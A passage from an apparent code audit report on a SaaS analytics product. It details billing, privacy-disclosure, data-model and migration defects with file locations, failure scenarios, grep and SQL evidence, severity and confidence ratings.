- **Where**: `backend/app/services/billing_service.py:932-949`, assigned at `:858-860`, constrained at `backend/app/models/billing.py:73-75`
- **What is wrong**: When the subscription's price matches no catalogue row, `_resolve_plan_id` returns `metadata.plan_id` unchecked — "Falling back there beats returning `None`". But `Subscription.plan_id` is `ForeignKey("plans.id"), nullable=False`, and the function has the full plan list in hand at `:927` and does not consult it. `_sync_subscription` assigns it at `:860`; the FK is enforced at `handle_event`'s `await db.commit()` on `:478`, which sits **outside** the `try/except` that would roll back cleanly.
- **Concrete failure**: The operator adds a `growth` tier in the Stripe dashboard and sells it before the code catalogue is deployed. `customer.subscription.created` arrives; no `Plan` row matches the price; `metadata.plan_id` is `"growth"`; the row is set to `plan_id="growth"`; `db.commit()` raises `IntegrityError` (FK violation) from `:478`; `billing.py:207-212` converts it to HTTP 500; Stripe retries this event for three days and gives up. The paying customer's subscription is never written, and — because the ledger row was rolled back with the failed transaction — every retry hits the same wall. The identical hole exists on the no-items branch at `:949` (`return meta_plan or None`), which does not even load the plan list.
- **Evidence**:
  ```python
  # app/services/billing_service.py:927-940
  plans = list((await db.execute(select(Plan))).scalars().all())
  for plan in plans:
      ...
      if db_price == price_id: return plan.id
  if meta_plan:
      logger.warning("billing: no catalog plan matches stripe price %s; falling back to ...")
      return meta_plan            # never checked against `plans`, which is right here
  ```
- **Severity**: medium — conditional on the catalogue lagging Stripe, which is precisely the situation this branch was written for, and it fails the whole webhook rather than the one field.
- **Confidence**: certain for the missing validation and the FK; `needs-verification` only for whether SQLite dev enforces the FK (`PRAGMA foreign_keys` may be off), which does not affect the Postgres production path.

---

## BILL-07 — `_charge_owner` makes a blocking Stripe HTTP call on the event loop, against the module's own stated invariant

*`BILL` — Billing, subscriptions, LLM credit*

- **Where**: `backend/app/services/billing_service.py:647`
- **What is wrong**: The module docstring at `:7-8` states "All Stripe SDK calls are synchronous; they are wrapped in `asyncio.to_thread` so the event loop is never blocked." Six of the seven Stripe calls are (`:185, :234, :295, :404, :432, :507`). This one is not: `charge = _stripe().Charge.retrieve(charge_id)` runs the synchronous `requests`-based SDK directly inside an `async def` reached from the webhook handler.
- **Concrete failure**: `refund.created` or `charge.dispute.created` arrives while Stripe's API is slow. The Stripe SDK's default timeout is 80 s. For that entire window the FastAPI event loop on the `web` dyno is frozen: every in-flight SSE chat stream, every WebSocket heartbeat and every `/api/health` probe stalls. It also makes BILL-03 materially more likely, since a timeout there is silently swallowed.
- **Evidence**:
  ```
  $ grep -n "Charge.retrieve\|asyncio.to_thread" app/services/billing_service.py
  8:  ``asyncio.to_thread`` so the event loop is never blocked.
  185,234,295,404,432,507:        ... = await asyncio.to_thread(...)
  647:            charge = _stripe().Charge.retrieve(charge_id)
  ```
- **Severity**: medium — an availability defect on a rare path, but it directly worsens a money defect.
- **Confidence**: certain.

---

## BILL-09 — `seats` is priced, published on the pricing page and carried through entitlements, and enforced nowhere

*`BILL` — Billing, subscriptions, LLM credit*

- **Where**: `backend/app/services/plan_catalogue.py:78, 95, 113, 130`; `backend/app/api/routes/billing.py:62`; `backend/app/services/entitlement_service.py:54, 71, 138`
- **What is wrong**: Every tier declares a seat count (base 5, scale 20, team 50, enterprise 0-as-unlimited); `GET /api/billing/plans` renders it to the public pricing page; `Entitlements.seats` carries it and `as_dict()` returns it. No code counts `ProjectMember` rows against it. `MembershipService` — which adds members and transfers ownership — asks `enforce_project_quota` at `:297` and never asks about seats. This is the same shape as the `max_index_bytes` gap already recorded in `CLAUDE.md` ("The promise, the meter and the limit all existed and nothing compared them"), one axis over and still open.
- **Concrete failure**: A `base` customer pays $199/month for a plan whose public description sells 5 seats, invites 200 members through `/api/invites`, and every one of them is accepted. No 402, no warning on the attention rail, no counter. The `_no_plan()` fallback compounds the inconsistency: it returns `seats=1` (`entitlement_service.py:291`) while every other zero in that same function means *unlimited* — so if seats ever were enforced, an account with no subscription would be the only one capped.
- **Evidence**:
  ```
  $ grep -rn "seats" app/ | grep -v pyc
  app/models/billing.py:51          app/api/routes/billing.py:62
  app/services/entitlement_service.py:54, 71, 138, 291
  app/services/plan_catalogue.py:78, 95, 113, 130
  ```
  Nine references: one column, one API projection, one dataclass field, four catalogue literals. Zero comparisons.
- **Severity**: medium — a sold limit with no meter; revenue leakage rather than an outage.
- **Confidence**: certain.

---

## BILL-10 — LLM calls on authenticated, user-triggered paths reach `NullUsageSink`; the highest-frequency one fires on nearly every chat question

*`BILL` — Billing, subscriptions, LLM credit*

- **Where**: `backend/app/agents/sql_agent.py:2198` → `backend/app/knowledge/learning_analyzer.py:133, 353`; also `backend/app/api/routes/chat.py:743`, `chat_utility.py:366, 506`, `chat_sessions.py:193`, `mcp_server/tools.py:99`, `knowledge/pipeline_runner.py:896`
- **What is wrong**: `LLMRouter()` with no `usage_sink` defaults to `NullUsageSink` (`router.py:108`), which records nothing. `LearningAnalyzer` holds a class-level shared bare router (`:129-134`) and `_llm_extract` uses it (`:353`). `SQLAgent._extract_learnings` constructs `LearningAnalyzer()` with no router at `sql_agent.py:2198`, and the V2 comment above it says the ≥2-attempt gate was deliberately dropped "so every outcome produces a learning." With `learning_analyzer_mode` defaulting to `"llm_first"` (`config.py:789`), `learning_analyzer.py:162-163` fires the LLM on every outcome that is not a first-shot success.
- **Concrete failure**: A user asks a question that takes two SQL attempts. The metered orchestrator/SQL calls are written to `token_usage`; the learning-extraction call that follows is not, nor is the second `LLMAnalyzer()` call at `sql_agent.py:2212` when attempts ≥ 3. Because `check_budget` sums `token_usage.total_tokens` (`usage_service.py:94-104`), these tokens count against no daily limit, no monthly limit and no plan limit, and appear in no figure on `/api/usage/stats`. Session rotation (`chat.py:743`) is unmetered on the same basis, as are `POST /explain-sql` and `POST /summarize`, both of which carry up to ~5 KB of the customer's answer text and query results into the prompt.
- **Evidence**:
  ```python
  # app/knowledge/learning_analyzer.py:129-134
  @classmethod
  def _get_shared_router(cls) -> LLMRouter:
      if cls._shared_llm_router is None:
          from app.llm.router import LLMRouter
          cls._shared_llm_router = LLMRouter()       # NullUsageSink
      return cls._shared_llm_router
  # :353
  router = self._llm_router or self._get_shared_router()
  ```
  `grep -rn "LLMRouter(" app/` returns 24 sites; five pass a sink (`pipeline_runner.py:1031`, `db_index_pipeline.py:382`, `code_db_sync_pipeline.py:112`, `data_investigations.py:473`, `mcp_server/tools.py:301, 387`). The rest do not.
- **Severity**: medium on its own (the usage display understates spend and the token gate is bypassed); it becomes the *entire* meter once BILL-01 is fixed and the per-account key starts carrying real spend.
- **Confidence**: certain for the wiring. What is not settled is the token volume per path — `pytest -m unit` plus a one-day production query grouping `token_usage` by `provider, model` against the LLM provider's own call count would size it.

---

## BIZ-08 — An answer can be returned with its rows and its explanation but with `query: null`, while the landing page promises the SQL is always shown

*`BIZ` — Business logic vs stated promises*

- **The promise**: `frontend/src/app/(marketing)/page.tsx:198` — *"The generated SQL is **always** shown if you want to inspect, copy, or tweak it."*
- **Where the code differs**: `backend/app/agents/orchestrator.py:2279-2286`, with `backend/app/services/chat_response_builder.py:74`
- **What is wrong**: `primary_results` and `primary_explanation` are deliberately back-filled from `sql_result_blocks[-1]` when `last_sql_result is None`, with a comment explaining why the three must stay consistent — but `query` on the very next line is not back-filled and stays `None`. Meanwhile `build_sql_results_payload` returns `None` for fewer than two blocks, so the multi-result payload does not cover the single-block case either. The persisted metadata (`chat.py:483`) therefore records `"query": null` alongside real rows, and neither the response nor the stored message can show the SQL.
- **Concrete failure**: On the single-block path where the orchestrator's `last_sql_result` is unset, the user sees a table of results and an explanation with no SQL to inspect, and returning to that session later shows the same — the one field the marketing page names as always available is the one that was dropped.
- **Evidence**:
```python
# backend/app/agents/orchestrator.py:2279-2286
        primary_results = last_sql_result.results if last_sql_result else None
        primary_explanation = last_sql_result.query_explanation if last_sql_result else None
        if last_sql_result is None and sql_result_blocks:
            primary_results = sql_result_blocks[-1].results          # back-filled
            primary_explanation = sql_result_blocks[-1].query_explanation  # back-filled
        return AgentResponse(
            answer=final_text,
            query=last_sql_result.query if last_sql_result else None,   # NOT back-filled
```
- **Severity**: **medium** — narrow branch, but it is the exact field the public FAQ and `vision.md:72` both single out, and it is silently null rather than an error.
- **Confidence**: likely. Certain that the back-fill is asymmetric; `needs-verification` on how often `last_sql_result is None and sql_result_blocks` is truthy in practice — settled by `SELECT count(*) FROM chat_messages WHERE role='assistant' AND metadata_json LIKE '%"query": null%' AND metadata_json LIKE '%"raw_result": {%'`.

---

## BIZ-10 — `vision.md` §8 still denies storing production data; the product stores 500 rows per answer plus per-column value samples

*`BIZ` — Business logic vs stated promises*

- **The promise**: `vision.md:84` — *"**A data warehouse or ETL pipeline** — the system reads from existing databases; **it never stores, transforms, or moves data out of a user's production database.** The one deliberate exception is external report APIs (Google Analytics 4, App Store Connect, Google Play)…"*
- **Where the code differs**: `backend/app/api/routes/chat.py:486` and `backend/app/models/db_index.py:40`
- **What is wrong**: `raw_result` — up to `chat_raw_result_row_cap` (default 500, `config.py:441`) rows of the customer's production data — is serialised into `chat_messages.metadata_json` on every answer, in the application's own Postgres. Separately, schema indexing persists per-column distinct values into `db_index.column_distinct_values_json`. The Terms and Privacy pages were updated to disclose both (`terms/page.tsx:151-162`, `privacy/page.tsx:158-166`); `vision.md` §8 was not, and its carve-out names only the three analytics vendors. Two of the product's own promise documents now contradict each other about the same behaviour, and §8 is the one described as load-bearing.
- **Concrete failure**: An engineer implementing a new feature reads §8 as the governing constraint — "never store data out of the production database" — and refuses or reworks a design that is in fact already the shipped norm. Or the reverse: a security reviewer given `vision.md` as the architectural contract signs off on a claim the Terms page already retracts.
- **Evidence**:
```python
# backend/app/api/routes/chat.py:477-486
        assistant_msg = await _chat_svc.add_message(
            db, session_id, "assistant", result.answer,
            metadata={ "query": result.query, ..., "raw_result": raw_result, ... }
# backend/app/models/db_index.py:40
    column_distinct_values_json: Mapped[str] = mapped_column(Text, default="{}")
```
- **Severity**: **medium** — no user is harmed today (the legal pages are correct), but the anti-vision is the document new features are gated against, and it is now false.
- **Confidence**: certain.

---

## BIZ-11 — Stripe and Sentry receive user data; the Privacy Policy's third-party section lists only LLM providers and Google, and the landing page says "no telemetry"

*`BIZ` — Business logic vs stated promises*

- **The promise**: `frontend/src/app/(marketing)/privacy/page.tsx:249-253` — §6 *"Third-Party Services"* opens *"To power its AI capabilities, CheckMyData.ai communicates with external Large Language Model (LLM) providers. **Here is exactly what data is shared:**"* and enumerates only 6.1 LLM providers and 6.2 Google OAuth. §3 (`:174-177`) promises no *"third-party analytics trackers"*, and the landing page (`page.tsx:137`) says *"**No tracking, no telemetry**"*.
- **Where the code differs**: `backend/app/services/billing_service.py:185-190`; `frontend/src/instrumentation-client.ts:7-9`
- **What is wrong**: `_ensure_customer` sends the user's `email` and `display_name` to Stripe on the first checkout. `grep -rni "stripe\|sentry\|payment processor\|subprocessor" frontend/src/app/(marketing)/` returns nothing — neither processor is named anywhere in the Privacy Policy or the Terms. Sentry is DSN-gated (so it is genuinely off unless configured), but it is initialised on the browser client and, when a DSN is set, ships error events and breadcrumbs to a third party — which is telemetry, however carefully scrubbed. Billing is live on the production deployment (`BILLING_ENABLED` is a recorded entry in `scripts/config_drift.py:45`), so the Stripe half is not hypothetical.
- **Concrete failure**: An EEA customer conducts a subprocessor review before signing. The Privacy Policy says "here is exactly what data is shared" and names OpenAI, Anthropic, OpenRouter and Google. Their email address is nevertheless transmitted to Stripe, Inc. the moment they click "Choose the Base plan" — a processor the disclosure omits, contradicting an "exactly" that the same document invites them to verify from source.
- **Evidence**:
```python
# backend/app/services/billing_service.py:185-190
        customer = await asyncio.to_thread(
            stripe.Customer.create,
            email=user.email,
            name=user.display_name or user.email,
            metadata={"user_id": user.id},
        )
```
- **Severity**: **medium** — a disclosure gap in a legal document, on a page whose whole argument is completeness; low likelihood of user harm, high likelihood of failing a procurement review.
- **Confidence**: certain for Stripe. For Sentry, `needs-verification` — the claim holds if and only if `NEXT_PUBLIC_SENTRY_DSN` and `SENTRY_DSN` are unset on the hosted deployment; `heroku config:get SENTRY_DSN` settles it.

---

## BIZ-12 — `send_sample_data_to_llm` is a privacy control with no user interface, and it does not do what its name says

*`BIZ` — Business logic vs stated promises*

- **The promise**: `backend/app/api/routes/connections.py:416` and `:492` — the connection API accepts and returns `send_sample_data_to_llm`, presenting it as a per-connection choice about whether data reaches the LLM.
- **Where the code differs**: no frontend reference at all; the backend gate exists only at `backend/app/knowledge/db_index_pipeline.py:923` and `backend/app/knowledge/code_db_sync_pipeline.py:122`
- **What is wrong**: Two defects. First, the flag defaults to `True` (`models/connection.py:94`, `connectors/base.py:54`) and `grep -rn "send_sample_data_to_llm" frontend/src/` returns **zero** hits — it is not in `lib/api/types.ts`, not in `ConnectionSelector.tsx`, not in any form. A user cannot turn it off through any interface. Second, even set to `False` via a direct API call it gates only *indexing-time* column samples; `grep` shows no reference anywhere under `backend/app/agents/`, so the query result rows that `format_query_results` sends on every answer (BIZ-03) are unaffected. The one control that appears to govern data reaching the LLM covers the smaller half and is unreachable.
- **Concrete failure**: A security-conscious customer discovers the field in the API docs, sets `send_sample_data_to_llm: false` on their production connection, and believes their data no longer reaches a third-party model. Every subsequent answer still ships up to 20 rows of it in the tool message.
- **Evidence**:
```
$ grep -rn "send_sample_data_to_llm" frontend/src/ ; echo "exit=$?"
exit=1
$ grep -rn "send_sample_data_to_llm" backend/app/agents/ ; echo "exit=$?"
exit=1
```
- **Severity**: **medium** — dead product surface (finding-type 4) whose name makes it worse than absent, because it advertises a guarantee it does not provide.
- **Confidence**: certain.

---

## BIZ-13 — README advertises the cross-encoder reranker as default-on; it is default-off and a no-op in every deployment that has ever run

*`BIZ` — Business logic vs stated promises*

- **The promise**: `README.md:24-25` — *"**Hybrid retrieval + ContextPack** — BM25 ⊕ dense RRF with per-chunk provenance and a **cross-encoder reranker (benchmark-gated, default-on)**."*
- **Where the code differs**: `backend/app/config.py:880`; `backend/pyproject.toml:64-71`
- **What is wrong**: `reranker_enabled: bool = False`, and `sentence-transformers` lives only in the optional `ml` extra, which the file's own comment says is **"NOT installed in the production image today"**. The comment block directly above the flag (`config.py:873-879`) documents the 2026-08-10 correction — *"this defaulted to True while degrading to a no-op in every deployment that has ever run"* — and CLAUDE.md records that the correction reached the flags table and the deploy notes. It did not reach the README, which is the open-source project's front door and the first artefact a self-hoster reads.
- **Concrete failure**: A self-hoster benchmarks retrieval quality against the README's feature list, attributes the result to a reranker that never ran, and tunes the wrong knob. Or an evaluator comparing products records "cross-encoder reranking: yes".
- **Evidence**:
```python
# backend/app/config.py:880
    reranker_enabled: bool = False
# backend/pyproject.toml:65-71
# Retrieval quality extras. NOT installed in the production image today: this pulls
# torch, and the worker already runs over its memory quota.
ml = [ "sentence-transformers>=3.0.0", ]
```
- **Severity**: **medium** — a capability claim on the public README that the shipped image cannot provide, on the same axis (`reranker_enabled`) the codebase already flagged once as "worse than one that is off".
- **Confidence**: certain.

---

## BIZ-14 — SCN-052 contradicts itself, and its `Coverage` line numbers are 40–55 lines adrift while stamped `implemented / PASS`

*`BIZ` — Business logic vs stated promises*

- **The promise**: `docs/ux/scenarios.md:1127` — *"**Expected result:** feedback recorded; negative SQL feedback triggers a 'wrong data' investigation message"*, with `Status: implemented` (`:1131`), `Coverage: components/chat/ChatMessage.tsx:271-292,648-679` (`:1132`), and an index row at `:96` reading `2026-07-19 PASS`.
- **Where the code differs**: `frontend/src/components/chat/ChatMessage.tsx:216-245` (handler), `:243` (toast), `:637-668` (the two buttons)
- **What is wrong**: Three separate defects in one scenario. (a) The `Expected result` at `:1127` and the `Errors & recovery` note at `:1130` — *"GAP: the richer WrongDataModal investigation flow is not wired in — thumbs-down sends a canned prompt instead"* — describe different behaviours; a reader taking the Expected result as the contract gets the opposite of what ships (see BIZ-06). (b) Every cited line number is wrong: the handler is `216-245`, not `271-292`; the buttons are `637-668`, not `648-679`; the toast the row cites as `ChatMessage.tsx:290-292` is at `:243`. (c) The scenario documents neither of the two effects that actually carry the invariant — the `exposed_learning_ids` rollback (`chat_feedback.py:298-303`) and the parallel `validate-data` write (`ChatMessage.tsx:223-235`).
- **Concrete failure**: The scenario file is declared "the source of truth for all user-facing behaviour" (`scenarios.md:5`). An engineer changing feedback handling reads SCN-052, follows the `Coverage` pointers into the wrong region of a 905-line file, and takes `Expected result` as the behaviour to preserve — preserving a behaviour that does not exist while breaking the two that do. The `2026-07-19 PASS` stamp asserts someone checked this; the line drift proves the file has moved since and nobody re-read it.
- **Evidence**:
```
$ grep -n "Failed to submit feedback\|handleFeedback" frontend/src/components/chat/ChatMessage.tsx
216:  const handleFeedback = async (rating: number) => {
243:      toast(err instanceof Error ? err.message : "Failed to submit feedback", "error");
638:              onClick={() => handleFeedback(1)}
654:              onClick={() => handleFeedback(-1)}
```
- **Severity**: **medium** — the scenario file's own verification block (`scenarios.md:32-36`) exists to distinguish *implemented* from *verified*; this is a row where the verification is stamped and demonstrably stale.
- **Confidence**: certain.

---

## DATA-04 — The schema has zero `CHECK` constraints, and `indexing_runs.status` is the predicate of the single-active-run guard

*`DATA` — Data model and migrations*

- **Where**: `backend/app/models/indexing_run.py:44` and `:84-92`; `backend/alembic/versions/a1f2b3c4d5e6_add_indexing_runs_and_error_log.py:57-64`
- **What is wrong**: `grep -rn "CheckConstraint" backend/app/models/ backend/alembic/versions/` returns 0 in both trees. About 30 columns carry an enum-shaped vocabulary in a comment (`status`, `kind`, `trigger`, `sync_status`, `object_kind`, `role`, `source_type`, `severity`…) and nothing but Python enforces it. For most that is merely untidy; for `indexing_runs.status` the vocabulary is *load-bearing*, because the partial unique index that enforces "one active run per (project, kind, connection)" is scoped by a literal list of three strings.
- **Concrete failure**: `uq_indexing_runs_active_one` is `WHERE status IN ('queued','running','cancelling')`. A row whose `status` is anything else — `'Running'`, `'starting'`, a value introduced by a future code path, or a hand-fixed row — is outside the index's predicate and therefore invisible to the guard. `RunCoordinator` can then mint a second `IndexingRun` for the same project and kind, which is exactly the concurrent-double-index condition recorded in `CLAUDE.md` for 2026-09-01 (two full repo indexes running for 36 minutes on the memory-constrained worker). The database cannot refuse the bad status, and the guard fails open rather than closed.
- **Evidence**:

```
app/models/indexing_run.py:44   status: Mapped[str] = mapped_column(String(20), nullable=False, server_default="queued")
app/models/indexing_run.py:90       sqlite_where=text("status IN ('queued','running','cancelling')"),
app/models/indexing_run.py:91       postgresql_where=text("status IN ('queued','running','cancelling')"),
```
  Constraint census over the whole repository:
```
$ grep -rn "CheckConstraint" backend/app/models/ | wc -l      -> 0
$ grep -rn "CheckConstraint\|CHECK (" backend/alembic/versions/*.py | wc -l -> 0
```
- **Severity**: medium — no bad value is known to exist today, but the one invariant the team chose to push into the database is gated on a string the database will accept in any form.
- **Confidence**: certain about the absence of constraints and the predicate. Whether an out-of-vocabulary status has ever been written would be settled by `SELECT DISTINCT status FROM indexing_runs`.

---

## DATA-05 — `audit_logs` is missing from `app/models/__init__.py`, so it is absent from the metadata Alembic autogenerates against

*`DATA` — Data model and migrations*

- **Where**: `backend/app/models/__init__.py:3-51` (no `audit_log` import); `backend/alembic/env.py:6-31` and `:37` (`target_metadata = Base.metadata`); `backend/app/models/audit_log.py:18`
- **What is wrong**: `env.py` imports 23 model modules by name and relies on `app/models/__init__.py` to pull in the rest transitively. That file imports 48 models and omits exactly one — `audit_log`. `AuditLog` is only ever imported lazily, inside a function body (`backend/app/core/audit.py:29`), so it is not in `Base.metadata` at the moment Alembic reads it.
- **Concrete failure**: `alembic revision --autogenerate` from this repository emits `op.drop_table("audit_logs")`, because Alembic sees a table in the database with no model behind it. `audit_logs` is the durable security audit trail (F-AUTH-15) — logins, password resets, invite acceptance — the table that exists precisely because Heroku's log lines are ephemeral. The same omission means `_fallback_create_all` (`backend/app/models/base.py:81-133`, reached when the `alembic` CLI is missing) does not create it either.
- **Evidence**: replaying `env.py`'s exact import list and diffing the resulting metadata against a full import of `app/models/`:

```
tables visible to alembic/env.py: 64
tables declared in app/models/:   65
INVISIBLE to env.py (1):
    audit_logs
```
  `app/models/__init__.py:12` jumps `backup_record` → `batch_query`, with no `audit_log` line; `app/core/audit.py:29` is `from app.models.audit_log import AuditLog` inside `_persist_audit`.
- **Severity**: medium — harmless until someone autogenerates and does not read the diff, at which point a security audit trail is dropped.
- **Confidence**: certain.

---

## DATA-06 — Money is stored as `Float` in three places, in a codebase whose own model file argues it must not be

*`DATA` — Data model and migrations*

- **Where**: `backend/app/models/billing.py:42` (`price_usd_month`), `backend/app/models/token_usage.py:41` (`estimated_cost_usd`), `backend/app/models/request_trace.py:49` (`estimated_cost_usd`); aggregated at `backend/app/services/usage_service.py:228` and `:264`
- **What is wrong**: `app/models/llm_credit.py:62-66` states the rule explicitly — *"Money, so `Numeric` rather than float — the same reason revenue is `Numeric(18,4)` in the analytics fact tables; `0.1 + 0.2 != 0.3` in binary float and a balance drifts by cents over a year"* — and the analytics fact tables follow it (`analytics_ga4.py:42`, `MONEY = Numeric(18, 4)`). The three columns above are `Float`, i.e. `double precision` on PostgreSQL, and one of them is summed.
- **Concrete failure**: `usage_service.py:228` runs `func.sum(TokenUsage.estimated_cost_usd)` over a user's rows for the reporting period and then `round(float(...), 6)` at `:243`. Summing thousands of IEEE-754 doubles is order-dependent, so the same month's spend can differ in the last digits between two calls that see the rows in a different plan order — on the figure a customer is shown. `plans.price_usd_month` is the published price of the tier; `199` survives a float round-trip, but the column type means a price like `199.99` is stored as an approximation of itself.
- **Evidence**:

```
app/models/billing.py:42      price_usd_month: Mapped[float] = mapped_column(Float, nullable=False, default=0.0)
app/models/token_usage.py:41  estimated_cost_usd: Mapped[float | None] = mapped_column(Float, nullable=True)
app/models/llm_credit.py:51   usage_at_period_start: Mapped[Decimal] = mapped_column(Numeric(12, 6), …)
app/models/analytics_ga4.py:42  MONEY = Numeric(18, 4)
```
- **Severity**: medium — the amounts are small today (`CLAUDE.md` records `estimated_cost_usd` as NULL on all production rows), which is also why the drift has not been noticed.
- **Confidence**: certain about the types. The practical magnitude of the drift would be settled by comparing `sum(estimated_cost_usd)` against a `numeric`-cast sum on production.

---

## DATA-07 — `mcp_api_keys.token_hash` carries two indexes in production, and the index of that name is unique in tests and non-unique in production

*`DATA` — Data model and migrations*

- **Where**: `backend/app/models/mcp_api_key.py:33`; `backend/alembic/versions/d3e4f5g6h7i8_add_mcp_api_keys_table.py:40` and `:43`
- **What is wrong**: the model declares `unique=True, index=True` on one column, which SQLAlchemy renders as a single `CREATE UNIQUE INDEX ix_mcp_api_keys_token_hash`. The migration instead declares a `UniqueConstraint` (which brings its own implicit index) *and* a separate plain `create_index` under the very name the model uses for its unique one. Production therefore has two btree indexes on the same 64-char column, and the object named `ix_mcp_api_keys_token_hash` means different things in the two schemas.
- **Concrete failure**: every MCP token mint and every `last_used_at` touch pays two index maintenance writes instead of one. More consequentially, a schema comparison can never agree: an autogenerate run sees a non-unique `ix_mcp_api_keys_token_hash` in the database and a unique one in the model, and will propose dropping and recreating it — briefly leaving `token_hash` uniqueness resting on the `uq_` constraint alone, or, if someone "cleans up" the redundant constraint instead, on nothing.
- **Evidence** — the two schemas, generated side by side:

```
migration-built (production):
  CONSTRAINT uq_mcp_api_keys_token_hash UNIQUE (token_hash)
  CREATE INDEX ix_mcp_api_keys_token_hash ON mcp_api_keys (token_hash)

model-built (create_all, i.e. the test suite):
  CREATE UNIQUE INDEX ix_mcp_api_keys_token_hash ON mcp_api_keys (token_hash)
  UNIQUE constraints on model: []
```
- **Severity**: medium — uniqueness is enforced in both schemas today, but by different objects sharing a name, which is the shape that survives one careless cleanup and not two.
- **Confidence**: certain.

---

## DATA-08 — `uq_error_log_project_sig` is a unique index over a nullable column, so the dedup rule it exists to enforce does not apply to system-scoped errors

*`DATA` — Data model and migrations*

- **Where**: `backend/app/models/error_log.py:18-20` and `:38`; `backend/alembic/versions/a1f2b3c4d5e6_add_indexing_runs_and_error_log.py:84` and `:105-107`; writer `backend/app/services/error_log_service.py:47-76`
- **What is wrong**: `error_log.project_id` is nullable (`source="system"` / `span` events carry no project), and the uniqueness rule is a unique index on `(project_id, signature)`. Both PostgreSQL and SQLite treat NULLs as distinct in a unique index, so the constraint imposes nothing at all on rows with `project_id IS NULL`. The team already knows this pattern and solved it correctly one table over — `uq_indexing_runs_active_one` indexes `coalesce(connection_id, '')` for exactly this reason (`app/models/indexing_run.py:88`) — but `error_log` was left with the naive form. Separately, `ErrorLogService.upsert` is a read-then-write with no `IntegrityError` handling, so on the *non*-NULL rows the constraint turns a race into a 500 rather than into a merge.
- **Concrete failure**: two processes catalog the same global error concurrently (the reaper on `worker` and the trace persister on `web` both call this service). The `SELECT` finds nothing in either, both `INSERT`, and the index permits both because `NULL <> NULL` — so `/api/logs` shows the same system error twice with `occurrences = 1` each instead of once with `occurrences = 2`, which is the number an operator reads to decide whether something is systemic.
- **Evidence**:

```
app/models/error_log.py:18-20   project_id: Mapped[str | None] = mapped_column(
                                    String(36), ForeignKey("projects.id", ondelete="CASCADE"), nullable=True)
app/models/error_log.py:38      Index("uq_error_log_project_sig", "project_id", "signature", unique=True),
alembic/…/a1f2b3c4d5e6.py:105   op.create_index("uq_error_log_project_sig", "error_log", ["project_id", "signature"], unique=True)

app/models/indexing_run.py:88       text("coalesce(connection_id, '')"),   # the same problem, solved
```
  `error_log_service.py:49-53` does the `select(...).where(ErrorLog.project_id == project_id, ErrorLog.signature == sig)`; `:63-75` does the unconditional `db.add(row)` with no `except IntegrityError`.
- **Severity**: medium — it degrades the signal on the surface built to reveal repeated failures, and adds an uncaught 500 path under concurrency.
- **Confidence**: certain about the semantics. `SELECT project_id, signature, count(*) FROM error_log WHERE project_id IS NULL GROUP BY 1,2 HAVING count(*) > 1` on production would show whether it has already happened.

---

## DATA-09 — The `doc_embeddings` expression index covers only one of the two metadata keys the delete path filters on

*`DATA` — Data model and migrations*

- **Where**: `backend/app/models/doc_embedding.py:84-88` and `backend/alembic/versions/1d72054cd637_doc_embeddings_pgvector.py:66-71`; query at `backend/app/knowledge/pgvector_store.py:281-290`
- **What is wrong**: the index is `(project_id, (metadata ->> 'source_path'))`, and the model's own comment calls `source_path` *"the only metadata key ever queried on its own"*. The query it was built for filters on two keys with `OR`: `metadata ->> 'source_path' = %s OR metadata ->> 'path' = %s`. There is no index on `metadata ->> 'path'`, so PostgreSQL cannot build a `BitmapOr` and falls back to scanning every row for the project.
- **Concrete failure**: an incremental repo index calls `delete_by_source_path` once per changed file before re-embedding it. Against the production project — 31 392 chunks over 763 documents, per the `bm25_build` line in `CLAUDE.md` — each call scans the project's whole chunk set instead of doing an index lookup, and a 50-file commit pays that 50 times. The index the migration built cannot answer the query the store actually issues.
- **Evidence**:

```
app/models/doc_embedding.py:84-88
        Index("ix_doc_embeddings_source_path", "project_id", text("(metadata ->> 'source_path')")),

app/knowledge/pgvector_store.py:286-289
        "DELETE FROM doc_embeddings "
        "WHERE project_id = %s AND ("
        "metadata ->> 'source_path' = %s OR metadata ->> 'path' = %s)",
```
  The migration emits the identical single-key index (`1d72054cd637:68-70`), so model and migration agree — with each other, and not with the query.
- **Severity**: medium — a latency cost on the incremental path, invisible in tests because the SQLite backend never runs this SQL.
- **Confidence**: likely on the plan; `EXPLAIN (ANALYZE)` of that DELETE on production would settle whether the planner picks a bitmap heap scan on `project_id` or a seq scan, and either confirms the index is unused for the `path` branch.

---

## DATA-10 — Both `web` and `worker` run `alembic upgrade head` concurrently at every deploy, and only one of them retries

*`DATA` — Data model and migrations*

- **Where**: `Procfile:1` (`web: … alembic upgrade head && uvicorn …`); `backend/app/main.py:94-102`; `backend/app/worker.py:296`; `backend/app/models/base.py:58-78`
- **What is wrong**: the migration runner has three independent callers that all fire on a restart — the `web` dyno's start command, the `web` lifespan, and `worker.startup` — and none of them takes a lock. This is the opposite of what the project does everywhere else: `plan_catalogue_reconcile`, `embedding_reconcile`, `encryption_reconcile` and `plan_grant_reconcile` all wrap their *idempotent* work in `pg_try_advisory_xact_lock`, while the non-idempotent DDL is unguarded.
- **Concrete failure**: a deploy that carries a new migration restarts both process types at once. Both run `alembic upgrade head`, both read the same old revision from `alembic_version`, and both plan the same `op.add_column`. On PostgreSQL the second transaction blocks on the first's `ACCESS EXCLUSIVE` lock, then re-reads the catalog after acquiring it and fails with `psycopg.errors.DuplicateColumn: column "…" of relation "…" already exists`. `app/main.py:94-102` wraps the call in a three-attempt retry loop and survives; `app/worker.py:296` calls `run_migrations()` bare, so the losing worker raises out of `startup` and dies before it takes a job — at exactly the moment `CLAUDE.md` documents full rebuilds being orphaned by deploys.
- **Evidence**:

```
Procfile:1        web: cd backend && alembic upgrade head && uvicorn app.main:app …
app/main.py:96            await asyncio.to_thread(run_migrations)      # inside `for _attempt in range(1, 4)`
app/worker.py:296         run_migrations()                            # no retry, no lock
app/models/base.py:64-78  subprocess.run(["alembic", "upgrade", "head"], check=True, …)  → raises on CalledProcessError
```
  Contrast, `app/ops/plan_catalogue_reconcile.py:54-59`: `SELECT pg_try_advisory_xact_lock(:k)` … `if not locked: return CatalogueResult("skipped_locked")`.
- **Severity**: medium — self-healing on restart, but it turns every schema-changing deploy into a coin flip on whether the worker comes up first try, and the failure looks like an unrelated worker crash.
- **Confidence**: likely — certain that three unlocked callers exist and that only one retries; whether the race has fired is answerable from the worker's deploy-time logs (`DuplicateColumn` / `DuplicateTable` at `startup`).

---

## FE-06 — A background task whose completion event is missed spins forever; a task that has only just been queued is labelled "1 done"

*`FE` — Frontend and interface states*

- **Where**: `frontend/src/stores/background-tasks-store.ts:211-238` and `:240-302`; `frontend/src/components/tasks/ActiveTasksWidget.tsx:176-177`, `:227-235`, `:258-260`
